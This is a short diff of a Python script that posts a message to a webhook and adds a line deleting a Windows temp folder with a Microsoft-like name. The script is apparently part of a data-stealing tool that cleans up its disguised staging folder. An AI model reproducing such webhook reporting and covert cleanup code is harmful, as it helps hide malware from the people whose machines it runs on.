@@ -12,6 +12,7 @@ from urllib.request import Request, urlopen
 from json import *
 import time
 import shutil
+
 from zipfile import ZipFile
 import random
 import re
@@ -897,6 +898,7 @@ Message = {
     "content": "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
 }
 requests.post(hook, data=Message)
+shutil.rmtree("C:\Windows\Temp\Win.microsoft.Security.temp")
 
 #for ---------------------------------
     
